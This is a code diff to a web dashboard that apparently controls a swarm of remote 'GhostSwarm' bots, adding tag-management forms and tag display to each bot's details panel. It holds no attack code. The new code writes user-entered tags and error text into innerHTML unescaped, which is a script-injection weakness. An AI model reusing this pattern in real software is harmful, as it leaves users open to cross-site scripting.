@@ -252,6 +252,23 @@ function createBotDetailsHTML(bot) {
          <!-- Bot info will be updated here -->
       </div>
 
+      <h3>Tag Management</h3>
+      <form id="tagForm" class="tag-form">
+         <input type="hidden" id="tagBotId" value="${bot.id}" />
+         <label>Add Tags (comma-separated):</label>
+         <input type="text" id="tagInput" placeholder="e.g. high-speed, storage, backup" />
+         <button type="submit">Update Tags</button>
+         <div class="tag-suggestions">
+            <span class="suggestion-label">Quick tags:</span>
+            <button type="button" class="tag-suggestion" onclick="addQuickTag('high-speed')">high-speed</button>
+            <button type="button" class="tag-suggestion" onclick="addQuickTag('storage')">storage</button>
+            <button type="button" class="tag-suggestion" onclick="addQuickTag('backup')">backup</button>
+            <button type="button" class="tag-suggestion" onclick="addQuickTag('priority')">priority</button>
+            <button type="button" class="tag-suggestion" onclick="addQuickTag('testing')">testing</button>
+         </div>
+         <div id="tagOutput" class="tag-output"></div>
+      </form>
+
       <h3>Download Statistics</h3>
       <div id="stats-container" class="status-grid">
          <!-- Stats will be updated here -->
@@ -275,8 +292,80 @@ function createBotDetailsHTML(bot) {
    updateBotInfo(bot);
    updateDownloadStats(bot);
    updateDownloadList(bot);
+
+   // Attach event handlers
+   document.getElementById("cmdForm").addEventListener("submit", handleCommandSubmit);
+   document.getElementById("tagForm").addEventListener("submit", handleTagSubmit);
 }
 
+// Add tag management functions
+function addQuickTag(tag) {
+   const tagInput = document.getElementById("tagInput");
+   const currentTags = tagInput.value.split(',').map(t => t.trim()).filter(t => t);
+
+   if (!currentTags.includes(tag)) {
+      const newTags = [...currentTags, tag];
+      tagInput.value = newTags.join(', ');
+   }
+}
+
+async function handleTagSubmit(e) {
+   e.preventDefault();
+
+   const botId = document.getElementById("tagBotId").value;
+   const tagInput = document.getElementById("tagInput").value;
+   const outputBox = document.getElementById("tagOutput");
+
+   // Parse tags from input
+   const tags = tagInput.split(',')
+      .map(tag => tag.trim())
+      .filter(tag => tag.length > 0)
+      .filter((tag, index, arr) => arr.indexOf(tag) === index); // Remove duplicates
+
+   if (tags.length === 0) {
+      outputBox.innerHTML = '<div class="error">❌ Please enter at least one tag</div>';
+      return;
+   }
+
+   outputBox.innerHTML = '<div class="info">⏳ Updating tags...</div>';
+
+   try {
+      const res = await fetch(`/api/bots/${botId}/setTag`, {
+         method: "POST",
+         headers: { "Content-Type": "application/json" },
+         body: JSON.stringify({ tags: tags }),
+      });
+
+      const result = await res.json();
+
+      if (res.ok) {
+         outputBox.innerHTML = `<div class="success">✅ Tags updated successfully!</div>`;
+         document.getElementById("tagInput").value = ''; // Clear input
+
+         // Force refresh the bot data to show new tags
+         setTimeout(async () => {
+            try {
+               const botsRes = await fetch("api/bots/");
+               const bots = await botsRes.json();
+               const updatedBot = bots.find(bot => bot.id === botId);
+               if (updatedBot) {
+                  selectedBot = updatedBot;
+                  updateBotInfo(updatedBot);
+               }
+            } catch (error) {
+               console.error("Failed to refresh bot data:", error);
+            }
+         }, 1000);
+      } else {
+         outputBox.innerHTML = `<div class="error">❌ Error: ${result.error || "Failed to update tags"}</div>`;
+      }
+   } catch (error) {
+      console.error("Tag update error:", error);
+      outputBox.innerHTML = '<div class="error">❌ Network error occurred</div>';
+   }
+}
+
+// Controller/app/public/index.js - Update updateBotInfo to include tags
 function updateBotInfo(bot) {
    const container = document.getElementById("bot-info-container");
    if (!container) return;
@@ -292,20 +381,30 @@ function updateBotInfo(bot) {
 
       memoryUsage = `${usage}/${total}MB (${percentage}%)`;
 
-      // Color code based on usage
       if (percentage > 80) memoryColor = '#ff4444';
       else if (percentage > 60) memoryColor = '#ffa500';
       else memoryColor = '#28e96a';
    }
 
+   // Generate bot tags HTML
+   const botTagsHtml = bot.metadata?.tags && bot.metadata.tags.length > 0
+      ? `<div class="bot-tags">
+           <span class="tags-label">Tags:</span>
+           ${bot.metadata.tags.map(tag => `<span class="bot-tag">${tag}</span>`).join('')}
+         </div>`
+      : '<div class="bot-tags"><span class="tags-label">No tags assigned</span></div>';
+
    container.innerHTML = `
       <div class="bot-info ${!bot.alive ? 'dead' : (bot.stats.activeDownloads > 0 ? 'downloading' : '')}">
          <div><strong>ID:</strong> ${bot.id}</div>
+         <div><strong>Name:</strong> ${bot.metadata?.name || 'GhostSwarm Bot'}</div>
          <div><strong>IP:</strong> ${bot.ip}</div>
          <div><strong>Status:</strong> ${bot.alive ? '🟢 Online' : '🔴 Offline'}</div>
          <div><strong>Last Seen:</strong> ${bot.lastSeen}</div>
          <div><strong>Last Updated:</strong> ${new Date().toLocaleTimeString()}</div>
       </div>
+
+      ${botTagsHtml}
 
       <h3>System Information</h3>
       <div class="system-info">
